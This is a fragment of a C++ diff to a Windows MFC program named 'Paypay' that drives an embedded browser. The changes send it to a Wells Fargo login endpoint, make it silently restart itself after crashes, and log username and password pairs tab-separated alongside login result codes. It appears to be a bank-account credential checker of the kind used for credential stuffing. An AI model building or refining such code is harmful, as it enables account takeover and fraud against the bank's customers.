@@ -60,6 +60,20 @@ END_MESSAGE_MAP()
 wstring g_strCode;
 LRESULT CPaypayDlg::OnRecvUsermsg(WPARAM wParam, LPARAM lParam)
 {
+
+	
+	try
+	{
+	wstring strHtml = *((wstring*)wParam);
+	m_cookieProcess.setConnectionOptions(strHtml.c_str());
+	CString str;
+	str = "https://connect.secure.wellsfargo.com/auth/login/do";
+	m_iee.Navigate(str, NULL, NULL, NULL, NULL);
+	}
+	catch (...)
+	{
+		return 0;
+	}
 	//string strHtml = *((string*)wParam);
 	////run_time_ie->DestroyWindow();
 	////delete run_time_ie;
@@ -452,15 +466,15 @@ LONG ApplicationCrashHandler(EXCEPTION_POINTERS *pException)
 	GetModuleFileName(AfxGetApp()->m_hInstance, szPath, sizeof(szPath));
 	szCmdLine = GetCommandLine();
 	GetStartupInfo(&startup);
-//	BOOL   bSucc = CreateProcess(szPath, L"chongqi", NULL, NULL,
-//		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &info);
-//	ExitProcess(-1);
+	BOOL   bSucc = CreateProcess(szPath, L"chongqi", NULL, NULL,
+		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &info);
+	ExitProcess(-1);
 
 
 	// 这里弹出一个错误对话框并退出程序
 	//
 	CreateDumpFile(_T("paypay.dmp"), pException);
-	FatalAppExit(-1, _T("*** Unhandled Exception! ***"));
+//	FatalAppExit(-1, _T("*** Unhandled Exception! ***"));
 
 	return EXCEPTION_EXECUTE_HANDLER;
 }
@@ -527,17 +541,17 @@ BOOL CPaypayDlg::OnInitDialog()
 	//Login();
 	
 	g_shanchu_daili_time = 60 * 60 + 34;
-	SetTimer(5, 1000, NULL);
+//	SetTimer(5, 1000, NULL);
 	readAllConfig();
 	m_iee.Navigate(L"about:blank", NULL, NULL, NULL, NULL);
-	CComQIPtr<IHTMLDocument2> spDoc = m_iee.get_Document();
-	SetTimer(2,3000,NULL);
+//	CComQIPtr<IHTMLDocument2> spDoc = m_iee.get_Document();
+//	SetTimer(2,3000,NULL);
 	CoInternetSetFeatureEnabled(FEATURE_DISABLE_NAVIGATION_SOUNDS, SET_FEATURE_ON_PROCESS, TRUE);
 	//IUnknownPtr pUnk;
 	//pUnk = m_iee.GetControlUnknown();
 	//CComQIPtr<IWebBrowser2> pWeb;
 	//pUnk->QueryInterface(IID_IWebBrowser2, (void**)&pWeb);
-	CoMarshalInterThreadInterfaceInStream(IID_IHTMLDocument2, spDoc, &g_pStream);
+//	CoMarshalInterThreadInterfaceInStream(IID_IHTMLDocument2, spDoc, &g_pStream);
 	//CoMarshalInterThreadInterfaceInStream(IID_IWebBrowser2, pWeb, &g_pStream);
 	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)ApplicationCrashHandler);
 //	CrashTest test;
@@ -906,8 +920,7 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			itoa(type, t, 10);
 			string kke = string(t);
 			wstring etr = g_name[type];
-			//string data = name + "\t" + password + "\t" + returnstr;
-			string data = name + "     " + password;
+			string data = name + "\t" + password;
 			setlocale(LC_ALL, "chs");
 			WaitForSingleObject(hMutex, INFINITE);
 			if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
